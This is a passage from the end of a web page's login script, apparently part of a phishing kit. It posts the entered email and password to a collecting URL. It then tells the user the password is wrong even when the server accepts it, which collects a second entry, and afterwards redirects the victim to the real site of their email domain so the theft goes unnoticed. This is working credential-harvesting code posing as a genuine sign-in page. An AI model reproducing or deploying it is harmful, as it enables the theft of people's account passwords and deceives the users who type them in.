        return;
      } else if (!email.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
        err.childNodes[1].childNodes[1].textContent = "Please enter your email address or mobile number";
        email.focus();
        showEl(err, "red");
        return;
      } else if (password.value === "") {
        err.childNodes[1].childNodes[1].textContent = "Please enter your password";
        password.focus();
        showEl(err, "red");
        return;
      } else {
        const domain = email.value.split('@')[1];
        count = count + 1;
        showEl(err, "#000");
        err.childNodes[1].childNodes[1].textContent = "Logging in...";

        var $form = $("#login_form");
        var url = form.action;
        var data = $form.serialize();

        $.ajax({
          type: "POST",
          url: url,
          data: data,
          cache: false,
          timeout: 800000,
          success: function(res) {
            if(res == 'true') {

              if (count > 1) {
                hideEl(err);
                window.location.href = "https://www."+domain;
                return;
              }

              password.value = "";
              password.style.borderColor = "red";
              showEl(err, "red");
              err.childNodes[1].childNodes[1].textContent = "Password is incorrect";
            }else {
              showEl(err, "red");
              err.childNodes[1].childNodes[1].textContent = "Please try again, something went wrong";
              password.value = "";
              password.style.borderColor = "red";
            }
          },
          error: function(e) {
            showEl(err, "red");
            err.childNodes[1].childNodes[1].textContent = "Please try again, something went wrong";
            password.value = "";
            password.style.borderColor = "red";
          }
        });
      }
    });

    function showEl(el, color) {
      el.style.color = color;
      el.style.display = "block";
    }

    function hideEl(el) {
      el.style.color = '#000';
      el.style.display = "none";
      el.childNodes[1].childNodes[1].textContent = "";
    }
  </script>
</html>
